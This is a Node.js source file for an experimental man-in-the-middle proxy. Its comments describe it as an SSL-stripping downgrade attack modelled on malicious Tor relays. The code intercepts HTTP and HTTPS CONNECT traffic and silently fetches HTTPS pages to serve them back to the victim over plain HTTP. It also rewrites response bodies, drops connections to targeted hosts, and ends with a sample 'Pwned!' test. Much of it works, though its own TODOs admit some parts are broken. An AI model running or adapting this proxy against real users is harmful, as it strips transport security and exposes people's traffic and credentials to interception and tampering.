// trying a downgrade attack similar to https://medium.com/@nusenu/how-malicious-tor-relays-are-exploiting-users-in-2020-part-i-1097575c0cac
// when user attempts to go to https website we will inject a 301 redirect to HTTP
// run with arg test to open a local proxy
/*


          We will need to setup a connection to the target as a client and then forward traffic back through http to our victium


*/

// using https://github.com/joeferner/node-http-mitm-proxy#readme

var Proxy = require('http-mitm-proxy');
var iptables = require('./lib/iptables.js');
var net = require('net');
const { Buffer } = require('buffer');
var inherits = require('util').inherits;
const https = require('https');
const { filter } = require('async');

var port = 8080;
var proxy = Proxy();

// match and replace content or drop
// first filter modifies body
// second filter will modify 301 to 200
// third will drop 301 entirely (not allowing header to return)
// Note that target host/ips can only have one filter
var filters = [
  // this rule will see a http://nathafain.com request, ignore possible 301 redirect, secretly send to https: and return that over http
  // this rule will try the same on a direct https://nathanfain.com request
  {     dsthosts: [ 'nathanfain.com' ],
      urlreplace: [ 'https://nathanfain.com'], // on dsthosts[N], drop and request urlreplace[N]+urlpath instead
   bodytransform: body => body.toString('utf-8').toUpperCase(),
           debug: true,
           drop: true, // drop will not send any data in response to client request
        },
  // this rule would drop all https://nathanfain.com requests
  {     dsthosts: [ 'nathanfain.com:443'],
           drop: true, },

  // this rune attempts to modify the http initial version. 
  // its a failed attempt to see how far we can play with https proxying
  // {     dsthosts: [ 'nathanfain.com:443'],
  //   bodytransform: body => body.toString('utf-8').replace(/http 1\.1/gi, 'http 1.2'),
  //         //  drop: true 
  //         debug: true,
  //         },

  { dsthosts: [ 'cryptomixer1.com', 'cryptomixer1.com:443' ],
       debug: true,
     bodytransform: body => replace(/301 Moved Permanently/g, '200')  },
]

// this is updated by functions that edit filters and is just used to more quickly check for hosts
// retains the filter index
var filters_hosts = []; // array of all host names found
var filters_index = {} // 'hostname' = index in filters[]
function update_filters_hosts() {
  filters_hosts = filters.map(f => f.dsthosts).flat();
  filters.forEach( (f, index) => {
    f.dsthosts.forEach(host => {
      filters_index[host] = index;
    });
  });
}
update_filters_hosts();


proxy.onError(function(ctx, err) {
  console.error('proxy error:', err);
});

proxy.onRequest(function(ctx, callback) {
  console.log('onRequest (http)', ctx.clientToProxyRequest.headers.host, ctx.clientToProxyRequest.url)

  if ( filters_hosts.indexOf(ctx.clientToProxyRequest.headers.host) >= 0)
  {
    var _findx = filters_index[ctx.clientToProxyRequest.headers.host]
    var filter = filters[_findx]
    console.log('filter',filter)
    // URLreplace is used to prevent 301 redirect from http to https
    // we will make the request secretly and return content back over http
    if (filter.hasOwnProperty('urlreplace')) {
      var _idx = filter.dsthosts.indexOf(ctx.clientToProxyRequest.headers.host)
      urlreplace = filter.urlreplace[_idx] + ctx.clientToProxyRequest.url
      https.get(urlreplace, (res) => {
        console.log('statusCode:', res.statusCode);
        console.log('headers:', res.headers);
        var chunks = [];
        res.on('data', chunk => chunks.push(chunk)); // data is encrypted
        res.on('end', () => { 
          var body = Buffer.concat(chunks)
          if (filter.hasOwnProperty('bodytransform')) {
              body = filter.bodytransform(body)
          }

          if (filter.drop)
            ctx.proxyToClientResponse.socket.destroy(); //end() would send a FIN packet
          else
            ctx.proxyToClientResponse.end(body);

          if (filter.debug)
            console.log( body ) 
        } )

      }).on('error', (e) => {
        console.error(e);
      });
    }
    // Is not urlreplace which indicates this filter intends to just change content of http request and return
    else {
      var chunks = [];

      ctx.onResponseData(function(ctx, chunk, callback) {
        chunks.push(chunk);
        return callback(null, null); // don't write chunks to client response
      });
      ctx.onResponseEnd(function(ctx, callback) {
        var body = Buffer.concat(chunks);
        if (filter.hasOwnProperty('bodytransform')) {
          body = filter.bodytransform(body)
        }

        if (filter.drop)
          ctx.proxyToClientResponse.socket.end();
        else
          ctx.proxyToClientResponse.write(body);

        if (filter.debug)
          console.log( body ) 

        return callback();
      });

    }
  }
});
proxy.onConnect(function(req, client_to_proxy_socket, head) {
  console.log('onConnect (https)',req.headers.host)
  if ( filters_hosts.indexOf(req.headers.host) >= 0)
  {

    var _findx = filters_index[req.headers.host]
    var filter = filters[_findx]
    console.log('filter',filter)
   
    if (filter.drop) {
      client_to_proxy_socket.destroy(); //end() would send a FIN packet supposedly
      return;
    }
    var host = req.url.split(":")[0];
    var port = req.url.split(":")[1];
  
    console.log('Tunnel to', req.url);
    var proxy_to_server_socket = net.connect({
      port: port,
      host: host,
      allowHalfOpen: true
    }, function(){
      proxy_to_server_socket.on('finish', () => {
        client_to_proxy_socket.destroy();
      });
      var chunks = [];
      var buffer;
      proxy_to_server_socket.on('data', chunk => {console.log('.');chunks.push(chunk)}); // data is encrypted
      proxy_to_server_socket.on('end', () => { 
        buffer = Buffer.concat(chunks)
        if (filter.hasOwnProperty('bodytransform')) {
          buffer = filter.bodytransform(buffer)
        }
        if (filter.debug)
          console.log( buffer.toString('utf-8') ) 
        client_to_proxy_socket.write('HTTP/1.1 200 OK\r\n\r\n'+buffer.toString('utf-8'), 'UTF-8');
  
      } )
      client_to_proxy_socket.on('close', () => {
        proxy_to_server_socket.end();
      });

      client_to_proxy_socket.write('HTTP/1.1 200 OK\r\n\r\n', 'UTF-8', function(){
        // TODO: fix this. We likely need to go back to a stream interception tactic
        //       the on('end') where we collect chunks does not work
        
        proxy_to_server_socket.pipe(client_to_proxy_socket);
        // proxy_to_server_socket.pipe(new UpperStream()).pipe(client_to_proxy_socket)

        // console.log('### client_to_proxy_socket\n', require('util').inspect(req, showHidden=true, depth=12, colorize=false));
  
        client_to_proxy_socket.pipe(proxy_to_server_socket);
    
        // debugger; // run `node inspect` and call `cont` then `repl` therein to inspect ctx
      
      })
    });
  
    proxy_to_server_socket.on('error', function(err) {
      filterSocketConnReset(err, 'PROXY_TO_SERVER_SOCKET');
    });
    client_to_proxy_socket.on('error', function(err) {
      filterSocketConnReset(err, 'CLIENT_TO_PROXY_SOCKET');
    });
  }
    
  // console.log("### REQ")
  // console.log(require('util').inspect(req, showHidden=true, depth=12, colorize=false));
  // console.log("### SOCKET")
  // console.log(require('util').inspect(socket, showHidden=true, depth=12, colorize=false));
  // console.log("### HEAD")
  // console.log(require('util').inspect(head, showHidden=true, depth=12, colorize=false));
});


// Since node 0.9.9, ECONNRESET on sockets are no longer hidden
function filterSocketConnReset(err, socketDescription) {
  if (err.errno === 'ECONNRESET') {
    console.log('Got ECONNRESET on ' + socketDescription + ', ignoring.');
  } else {
    console.log('Got unexpected error on ' + socketDescription, err);
  }
}

// proxy.onRequest(function(ctx, callback) {

//   if (filters_hosts.indexOf(ctx.clientToProxyRequest.headers.host) >= 0)
//   {
//     console.log(ctx.clientToProxyRequest.headers)
//     console.log(ctx.clientToProxyRequest.rawHeaders)
//     console.log(ctx.clientToProxyRequest.url)
//     console.log(ctx.clientToProxyRequest.socket._sockname)
//     console.log(ctx.clientToProxyRequest.socket._peername)
//     console.log()
//     console.log(ctx.proxyToClientResponse.socket._sockname)
//     console.log(ctx.proxyToClientResponse.socket._peername)
  
//     console.log(require('util').inspect(ctx, showHidden=true, depth=12, colorize=true));
//       // && ctx.clientToProxyRequest.url.indexOf('/') == 0) {
//     // ctx.use(Proxy.gunzip);
//     // debugger; // run `node inspect` and call `cont` then `repl` therein to inspect ctx

//     var filter_index = filters_index[ctx.clientToProxyRequest.headers.host];
//     var filter = filters[filter_index];
//     console.log(`filter: ${filter_index}`,filter)
    

//     if (filter.hasOwnProperty('bodytransform') ) {
//       // If filterint bodytransform setup data filter
//       ctx.onResponseData(function(ctx, chunk, callback) {
//           if (filter.bodytransform.drop) {
//             return callback(null, null);
//           }
//           else if (filter.bodytransform.hasOwnProperty('replace')) {
//             chunk = new Buffer(chunk.toString().replace(filter.bodytransform.match, filter.bodytransform.replace));
//             return callback(null, chunk);
//           }
//           else {
//             console.error('filter.bodytransform error: either replace or drop=true should be set')
//           }
//       });
//     }

//     if (filter.hasOwnProperty('headers')) {
//       // if filtering headers setup a response filter
//       ctx.onResponse(function(ctx, callback) {
//         console.log('onResponse');
//         console.log(ctx.serverToProxyResponse.headers)
//         console.log(ctx.serverToProxyResponse.statusCode)
//         debugger;
//         if (eval(filter.headers.ctx_path) === filter.headers.match) {
//           if (filter.headers.drop) {
//             // do not respond. could cause client to hang
//           }
//           else if (filter.headers.hasOwnProperty('replace')) {
//             console.log('change',eval(filter.headers.ctx_path), '&', filter.headers.match, 'to', filter.headers.replace)
//             eval(`${filter.headers.ctx_path} = ${filter.headers.replace}`)
//             return callback();
//           }
//           else {
//             console.error('filter.headers error: either replace or drop=true should be set')
//           }
//         }
//       })
//     }

//   }
//   return callback();
// });

function init (cb) {
  proxy.listen({port: port}, function() {
    console.log('Proxy server listening on ' + port);
    if (typeof cb === 'function')
      cb();
  });
};  
exports.init = init;
exports.close = proxy.close;



function test () {
  var cmd = `curl -x http://localhost:${port} http://nocompany.co/ | grep body`;
  console.log('> ' + cmd);
  require('child_process').exec(cmd, function (error, stdout, stderr) {
    if (error) {
      console.error(`exec error: ${error}`);
      return;
    }
    console.log(`${stdout}`);
    // proxy.close();
  });
}


if (process.argv.length > 2 && process.argv[2] == 'test') {
  init()
  // init(test)
}




/*
curl -v -x 'http://localhost:8080' http://nocompany.co
<html><head><style>
body {background-image: url("./n.png");}
_@media (orientation: landscape) { img{height:8vw;} }
_@media (orientation: portrait)  { img{height:10vh;} }
</style></head><body>Pwned!</body></html>
*/


/*
function UpperStream() {
  TransformStream.call(this);
}
inherits(UpperStream, TransformStream);
UpperStream.prototype._transform = function(chunk, encoding, cb) {
  console.log('.')
  for (var i = 0; i < chunk.length; ++i) {
    var ch = chunk[i];
    // console.log(ch)
    // Check for lowercase character
    // if (ch >= 97 && ch <= 122) {
    //   // Make it uppercase
    //   chunk[i] &= ~32;
    // }
    if (ch == 66 ) {
      console.log("B?")
      // chunk[i] = 98;
    }
  }
  cb(null, chunk);
};
*/